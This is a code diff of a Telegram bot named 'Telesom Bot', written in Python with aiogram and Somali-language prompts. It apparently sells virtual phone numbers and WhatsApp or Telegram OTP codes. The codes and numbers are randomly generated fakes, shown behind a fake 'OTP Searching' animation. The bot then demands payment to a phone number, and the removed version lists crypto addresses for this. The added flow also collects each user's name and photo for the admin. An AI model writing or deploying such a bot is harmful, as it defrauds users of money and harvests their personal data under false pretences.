@@ -2,182 +2,155 @@ import os
 import random
 import asyncio
 from aiogram import Bot, Dispatcher, F
-from aiogram.types import Message, CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup
+from aiogram.types import *
 from aiogram.filters import Command
+from aiogram.fsm.storage.memory import MemoryStorage
+from aiogram.fsm.context import FSMContext
+from aiogram.fsm.state import StatesGroup, State
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 ADMIN_ID = 7983838654
 
 bot = Bot(token=BOT_TOKEN)
-dp = Dispatcher()
+dp = Dispatcher(storage=MemoryStorage())
 
-# ====== TEMP STORAGE ======
+# ===== STORAGE =====
 user_orders = {}
-pending_otps = {}
+confirmed_codes = {}
 
-# ====== NUMBER GENERATORS ======
-def generate_virtual_number():
-    return "063" + "".join(str(random.randint(0, 9)) for _ in range(7))
+# ===== STATES =====
+class CodeState(StatesGroup):
+    waiting_code = State()
+    waiting_name = State()
+    waiting_photo = State()
 
-def generate_vip_number():
-    return "06349" + "".join(str(random.randint(0, 9)) for _ in range(5))
+# ===== HELPERS =====
+def generate_code():
+    return "".join(random.choice("0123456789") for _ in range(6))
 
-# ====== START ======
+# ===== START =====
 @dp.message(Command("start"))
-async def start_handler(message: Message):
+async def start(msg: Message):
     kb = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="VIRTUAL", callback_data="virtual")],
-        [InlineKeyboardButton(text="CARD", callback_data="card")]
+        [InlineKeyboardButton(text="CODE CHECK", callback_data="code_check")]
     ])
-    await message.answer("Ku soo dhawoow Telesom Bot", reply_markup=kb)
+    await msg.answer("Ku soo dhawoow Telesom Bot", reply_markup=kb)
 
-# ====== VIRTUAL ======
+# ===== VIRTUAL =====
 @dp.callback_query(F.data == "virtual")
-async def virtual_menu(call: CallbackQuery):
+async def virtual(call: CallbackQuery):
     kb = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="WHATSAPP", callback_data="whatsapp")],
-        [InlineKeyboardButton(text="TIKTOK", callback_data="tiktok")],
-        [InlineKeyboardButton(text="TELEGRAM", callback_data="telegram")],
-        [InlineKeyboardButton(text="GOOGLE", callback_data="google")]
+        [InlineKeyboardButton(text="TELEGRAM", callback_data="telegram")]
     ])
-    await call.message.edit_text("Dooro adeeg:", reply_markup=kb)
+    await call.message.edit_text("Dooro Adeeg:", reply_markup=kb)
 
-@dp.callback_query(F.data.in_(["whatsapp", "tiktok", "telegram", "google"]))
-async def virtual_selected(call: CallbackQuery):
+@dp.callback_query(F.data.in_(["whatsapp", "telegram"]))
+async def service_selected(call: CallbackQuery):
     service = call.data
-    otp_message = await call.message.edit_text("OTP •")
 
-    # animation wareegaya 5 sec
-    for i in range(5):
-        dots = "." * ((i % 3) + 1)
-        await asyncio.sleep(1)
-        await otp_message.edit_text(f"OTP{dots}")
-
-    # keydi order
-    number = generate_virtual_number()
     user_orders[call.from_user.id] = {
-        "type": "Virtual",
         "service": service,
-        "number": number,
-        "price": "$1"
+        "paid": False
     }
-    pending_otps[call.from_user.id] = True
 
-    # sug 5 sec si admin u confirm
-    await asyncio.sleep(5)
-    if pending_otps.get(call.from_user.id):
-        await call.message.answer("Please Send Money 💵")
-
-# ====== CARD ======
-@dp.callback_query(F.data == "card")
-async def card_menu(call: CallbackQuery):
     kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="VIP", callback_data="vip")],
-        [InlineKeyboardButton(text="NORMAL", callback_data="normal")]
+        [InlineKeyboardButton(text="CONFIRM", callback_data="confirm_payment")],
+        [InlineKeyboardButton(text="CANCEL", callback_data="cancel_payment")]
     ])
-    await call.message.edit_text("Dooro nooca Card:", reply_markup=kb)
 
-@dp.callback_query(F.data == "vip")
-async def vip_selected(call: CallbackQuery):
-    numbers = "\n".join(generate_vip_number() for _ in range(3))
-    user_orders[call.from_user.id] = {
-        "type": "VIP",
-        "number": numbers,
-        "price": "$15"
-    }
-    kb = payment_keyboard()
     await call.message.edit_text(
-        f"VIP Numbers:\n{numbers}\n\nPLEASE SEND MONEY BEFORE\nAND GET YOUR VIP CARD 💵",
+        "💵 Fadlan lacag ku dir:\n+252907868526\n\nKadib riix CONFIRM",
         reply_markup=kb
     )
 
-@dp.callback_query(F.data == "normal")
-async def normal_selected(call: CallbackQuery):
-    number = generate_virtual_number()
-    user_orders[call.from_user.id] = {
-        "type": "Normal",
-        "number": number,
-        "price": "$1"
-    }
-    kb = payment_keyboard()
-    await call.message.edit_text(
-        f"Number-kaaga:\n{number}\n\nPLEASE SEND MONEY BEFORE\nAND GET YOUR NORMAL CARD 💵",
-        reply_markup=kb
-    )
+@dp.callback_query(F.data == "cancel_payment")
+async def cancel(call: CallbackQuery):
+    await call.message.edit_text("Order Cancelled ❌")
 
-# ====== PAYMENT ======
-def payment_keyboard():
-    return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="LOCAL PAYMENT", callback_data="local")],
-        [InlineKeyboardButton(text="CRYPTO CURRENCY", callback_data="crypto")]
-    ])
+@dp.callback_query(F.data == "confirm_payment")
+async def confirm_payment(call: CallbackQuery):
+    msg = await call.message.edit_text("OTP Searching.")
 
-@dp.callback_query(F.data == "local")
-async def local_payment(call: CallbackQuery):
-    await call.message.answer("Fadlan lacag ku dir:\n+252907868526")
-    await send_admin_request(call.from_user.id)
+    for i in range(5):
+        await asyncio.sleep(1)
+        dots = "." * ((i % 3) + 1)
+        await msg.edit_text(f"OTP Searching{dots}")
 
-@dp.callback_query(F.data == "crypto")
-async def crypto_menu(call: CallbackQuery):
-    await call.message.answer(
-        "BNB Address:\n`0x98ffcb29a4fc182d461ebdba54648d8fe24597ac`\n\n"
-        "USDT-BEP20 Address:\n`0x98ffcb29a4fc182d461ebdba54648d8fe24597ac`",
-        parse_mode="Markdown"
-    )
-    await send_admin_request(call.from_user.id)
+    # generate code
+    code = generate_code()
+    confirmed_codes[call.from_user.id] = code
 
-# ====== ADMIN REQUEST ======
-async def send_admin_request(user_id):
-    if user_id not in user_orders:
-        return
-    order = user_orders[user_id]
+    # send admin request
     kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="CONFIRM", callback_data=f"confirm_{user_id}")],
-        [InlineKeyboardButton(text="REJECT", callback_data=f"reject_{user_id}")],
-        [InlineKeyboardButton(text="BAN", callback_data=f"ban_{user_id}")]
+        [InlineKeyboardButton(text="CONFIRM", callback_data=f"admin_confirm_{call.from_user.id}")]
     ])
+
     await bot.send_message(
         ADMIN_ID,
-        f"NEW ORDER\n\nUser ID: {user_id}\nType: {order['type']}\n"
-        f"Number:\n{order['number']}\nPrice: {order['price']}",
+        f"New Payment Request\nUser: {call.from_user.id}\nCode: {code}",
         reply_markup=kb
     )
 
-# ====== ADMIN ACTIONS ======
-@dp.callback_query(F.data.startswith("confirm_"))
-async def confirm_user(call: CallbackQuery):
-    user_id = int(call.data.split("_")[1])
-    if user_id in user_orders:
-        order = user_orders[user_id]
-        service = order.get("service", "virtual")
-        code = "".join(random.choice("0123456789") for _ in range(6))
-        if service == "whatsapp":
-            final_code = f"WhatsApp Code: {code}-{random.randint(100,999)}"
-        elif service == "telegram":
-            final_code = f"Telegram Code: {code}"
-        elif service == "google":
-            final_code = f"Google Code: G-{code}"
-        elif service == "tiktok":
-            final_code = f"TikTok Code: TT{code}"
-        else:
-            final_code = f"Code: {code}"
-        pending_otps[user_id] = False
-        await bot.send_message(user_id, f"Payment Confirmed ✅\n\n{final_code}")
-    await call.message.edit_text("Confirmed")
+    await asyncio.sleep(5)
 
-@dp.callback_query(F.data.startswith("reject_"))
-async def reject_user(call: CallbackQuery):
-    user_id = int(call.data.split("_")[1])
-    await bot.send_message(user_id, "Payment Rejected ❌")
-    await call.message.edit_text("Rejected")
+    await call.message.answer("PLEASE SEND MONEY 💵")
 
-@dp.callback_query(F.data.startswith("ban_"))
-async def ban_user(call: CallbackQuery):
-    user_id = int(call.data.split("_")[1])
-    await bot.send_message(user_id, "You are Banned ❌")
-    await call.message.edit_text("User Banned")
+# ===== ADMIN CONFIRM =====
+@dp.callback_query(F.data.startswith("admin_confirm_"))
+async def admin_confirm(call: CallbackQuery):
+    user_id = int(call.data.split("_")[-1])
+    code = confirmed_codes.get(user_id)
 
-# ====== RUN ======
+    await bot.send_message(user_id, f"Payment Confirmed ✅\nYour Code: {code}")
+    await call.message.edit_text("Approved ✅")
+
+# ===== CODE CHECK =====
+@dp.callback_query(F.data == "code_check")
+async def code_check(call: CallbackQuery, state: FSMContext):
+    await call.message.answer("Fadlan geli code kaaga:")
+    await state.set_state(CodeState.waiting_code)
+
+@dp.message(CodeState.waiting_code)
+async def check_code(msg: Message, state: FSMContext):
+    user_code = msg.text
+
+    if user_code in confirmed_codes.values():
+        kb = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="CARD 1", callback_data="card1")],
+            [InlineKeyboardButton(text="CARD 2", callback_data="card2")],
+            [InlineKeyboardButton(text="CARD 3", callback_data="card3")]
+        ])
+        await msg.answer("Dooro Card:", reply_markup=kb)
+        await state.clear()
+    else:
+        await msg.answer("Code khalad ah ❌")
+
+# ===== CARD SELECT =====
+@dp.callback_query(F.data.in_(["card1","card2","card3"]))
+async def card_select(call: CallbackQuery, state: FSMContext):
+    await call.message.answer("Magacaaga qor 3 jeer:")
+    await state.set_state(CodeState.waiting_name)
+
+@dp.message(CodeState.waiting_name)
+async def get_name(msg: Message, state: FSMContext):
+    await state.update_data(name=msg.text)
+    await msg.answer("Fadlan sawirkaaga soo dir:")
+    await state.set_state(CodeState.waiting_photo)
+
+@dp.message(CodeState.waiting_photo, F.photo)
+async def get_photo(msg: Message, state: FSMContext):
+    data = await state.get_data()
+    name = data.get("name")
+
+    await bot.send_message(ADMIN_ID, f"User Card Request\nName:\n{name}")
+    await bot.send_photo(ADMIN_ID, msg.photo[-1].file_id)
+
+    await msg.answer("Request Sent To Admin ✅")
+    await state.clear()
+
+# ===== RUN =====
 async def main():
     await dp.start_polling(bot)
 
